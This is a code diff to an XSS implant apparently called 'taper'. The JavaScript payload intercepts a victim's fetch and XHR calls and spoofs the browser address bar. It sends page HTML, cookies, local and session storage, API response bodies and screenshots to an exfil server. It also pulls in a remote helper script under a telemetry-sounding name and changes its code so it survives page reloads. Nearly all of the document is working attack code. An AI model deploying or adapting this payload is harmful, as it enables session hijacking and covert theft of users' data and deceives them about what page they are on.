@@ -19,7 +19,10 @@ function initGlobals()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = "trap";
+	window.taperMode = "implant";
+
+	// Exfil server
+	window.taperexfilServer = "https://127.0.0.1:8444";
 
 
 	if (window.taperMode === "trap")
@@ -44,13 +47,23 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		window.taperstartingPage = "http://targetapp.localdemo/wp-admin";
-		//window.taperstartingPage = "https://127.0.0.1:8443/";
+		//window.taperstartingPage = "http://targetapp.localdemo/wp-admin";
+		window.taperstartingPage = "https://127.0.0.1:8443/";
+	}
+	else // if implant mode
+	{
+		// if we're in implant mode we could be unloaded and reloaded over and over
+		// On page unload we need to remove the flag in storage that says the 
+		// payload is already loaded, so that it will startup again.
+
+		window.addEventListener("beforeunload", function()
+		{
+			console.log("**** Unloading page, removing payload loaded flag...");
+			sessionStorage.removeItem("taperSystemLoaded");
+		});
 	}
 
 
-	// Exfil server
-	window.taperexfilServer = "https://127.0.0.1:8444";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -58,43 +71,55 @@ function initGlobals()
 	
 
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = false;
+	window.monkeyPatchAPIs = true;
 
 
 	// Should we capture a screenshot after a delay after an API call?
 	// The data that came back from the API call might have been used to update
-	// the UI
+	// the UI. Delay is in milliseconds
 	window.postApiCallScreenshot = true;
-	window.screenshotDelay       = 1500;
+	window.screenshotDelay       = 1000;
 
 
 	// Helpful variables
 	// window.taperlastFakeUrl = "";
 
-	sessionStorage.setItem('taperLastUrl', '');
-
+	if (!sessionStorage.hasOwnProperty('taperLastUrl'))
+	{
+		sessionStorage.setItem('taperLastUrl', '');
+	}
 
 	// Slow down the html2canvas
 	window.taperloaded = false;
 
 
-	// Client UUID
-	sessionStorage.setItem('taperSessionUUID', '');
+	// Client UUID 
+	if (!sessionStorage.hasOwnProperty('taperSessionUUID'))
+	{
+		sessionStorage.setItem('taperSessionUUID', '');
+	}
 	// window.taperSessionUUID = "";
 
 	// Cookie storage
 	// window.tapercookieStorageDict = {};
-	sessionStorage.setItem('taperCookieStorage', '');
-
+	if (!sessionStorage.hasOwnProperty('taperCookieStorage'))
+	{
+		sessionStorage.setItem('taperCookieStorage', '');
+	}
 
 	// Local storage
 	// window.taperlocalStorageDict = {};
-	sessionStorage.setItem('taperLocalStorage', '');
-
+	if (!sessionStorage.hasOwnProperty('taperLocalStorage'))
+	{
+		sessionStorage.setItem('taperLocalStorage', '');
+	}
 
 	// Session storage
 	// window.tapersessionStorageDict = {};
-	sessionStorage.setItem('taperSessionStorage', '');
+	if (!sessionStorage.hasOwnProperty('taperSessionStorage'))
+	{
+		sessionStorage.setItem('taperSessionStorage', '');
+	}
 }
 
 
@@ -524,7 +549,7 @@ function captureUrlChangeLoot()
 // iframe trap, not the one with the XSS vuln. 
 function runUpdate()
 {
-	// console.log("*** Top of runUpdate...");
+	console.log("*** Top of runUpdate...");
 	var currentUrl = "";
 	var fullUrl = "";
 
@@ -600,7 +625,11 @@ function runUpdate()
 
 				// Fake the URL that the user sees. 
 				// This is important for iFrame trap mode. 
-				window.history.replaceState(null, '', currentUrl);
+				console.log("In upper address bar spoof, current url is: " + currentUrl);
+				if (currentUrl != 'blank')
+				{
+					window.history.replaceState(null, '', currentUrl);
+				}
 
 				captureUrlChangeLoot();
 			}
@@ -638,7 +667,11 @@ function runUpdate()
 	if (window.taperMode === "trap")
 	{
 		// Fake the URL that the user sees. This is important. 
-		window.history.replaceState(null, '', currentUrl);
+		console.log("In lower address bar spoof, current url is: " + currentUrl);
+		if (currentUrl != 'blank')
+		{
+			window.history.replaceState(null, '', currentUrl);
+		}
 	}
 }
 
@@ -682,6 +715,7 @@ function customFetch(url, options)
 		console.log("$$$$$ Skipping fetch intercept");
 		return;
 	}
+
 	console.log("** Cloned Fetch API call**");
 	console.log("Fetch url: " + url);
 	console.log("Fetch method: " + options.method);
@@ -734,9 +768,6 @@ function customFetch(url, options)
 			console.log('Response Status:', response.status);
 			console.log('Response Headers:', response.headers);
 			console.log('Response Body:', body);
-
-			// Flag this one as now intercept
-			this.noIntercept = true;
 
 			// send API call body loot
 			request = new XMLHttpRequest();
@@ -886,6 +917,12 @@ function monkeyPatchXHR()
 		};
 
 		xhrOriginalSend.apply(this, arguments);
+
+		// Check if we should take a screenshot now
+		if (window.postApiCallScreenshot)
+		{
+			setTimeout(sendScreenshot, window.screenshotDelay);
+		}
 	}
 }
 
@@ -956,6 +993,7 @@ function takeOver()
 		}
 	}		
 
+
 	// Monkey patch underlaying API calls?
 	if (window.monkeyPatchAPIs)
 	{
@@ -984,59 +1022,67 @@ function takeOver()
 
 if (sessionStorage.getItem('taperSystemLoaded') != "true")
 {
-	sessionStorage.setItem("taperSystemLoaded","true");
+	sessionStorage.setItem("taperSystemLoaded", "true");
 	initGlobals();
 
 
-	// Get our client UUID
-	// request = new XMLHttpRequest();
-	request = new window.taperXHR();
-	request.noIntercept = true;
-	request.open("GET", window.taperexfilServer + "/client/getToken", true);
-	request.send(null);
-
-	request.onreadystatechange = function()
+	// Just because we reloaded the payload doesn't mean
+	// we don't already have our session/UUID. Check first before
+	// overwriting
+	if (sessionStorage.getItem('taperSessionUUID') === '')
 	{
-		if (request.readyState == XMLHttpRequest.DONE)
+		// Get our client UUID
+		request = new window.taperXHR();
+		request.noIntercept = true;
+		request.open("GET", window.taperexfilServer + "/client/getToken", true);
+		request.send(null);
+
+		request.onreadystatechange = function()
 		{
-			if (request.status == 200)
+			if (request.readyState == XMLHttpRequest.DONE)
 			{
-
-				// We have a session, start taking over
-
-				if (window.taperMode === "trap")
+				if (request.status == 200)
 				{
-					// Blank main page
-					document.body.innerHTML = "";
-					document.body.outerHTML = "";
+					// We have a session, start taking over
+					if (window.taperMode === "trap")
+					{
+						// Blank main page
+						document.body.innerHTML = "";
+						document.body.outerHTML = "";
+					}
+
+					// Pull in html2canvas
+					var js = document.createElement("script");
+					js.type = "text/javascript";
+					js.src = taperexfilServer + "/lib/telemhelperlib.js";
+
+
+					this.temp_define = window['define'];
+					document.body.appendChild(js);
+					window['define'] = undefined;
+					console.log("HTML2CANVAS added to DOM");
+
+
+
+					var jsonResponse = JSON.parse(request.responseText);
+					sessionStorage.setItem('taperSessionUUID', jsonResponse.clientToken);
+
+
+    				// We're ready to trap all the things now
+					takeOver();
 				}
-
-				// Pull in html2canvas
-				var js = document.createElement("script");
-				js.type = "text/javascript";
-				js.src = taperexfilServer + "/lib/telemhelperlib.js";
-
-
-				this.temp_define = window['define'];
-				document.body.appendChild(js);
-				window['define'] = undefined;
-				console.log("HTML2CANVAS added to DOM");
-
-
-
-				var jsonResponse = JSON.parse(request.responseText);
-				//window.taperSessionUUID = jsonResponse.clientToken;
-				sessionStorage.setItem('taperSessionUUID', jsonResponse.clientToken);
-
-
-    			// We're ready to trap all the things now
-				takeOver();
-			}
-			else
-			{
-				console.log("No client session received, skipping");
+				else
+				{
+					console.log("No client session received, skipping");
+				}
 			}
 		}
+	}
+	else
+	{
+		console.log("*** taperSessionUUID not null, not requesting a new one: " + sessionStorage.getItem('taperSessionUUID'));
+		takeOver();
+		sendScreenshot();
 	}
 }
 else
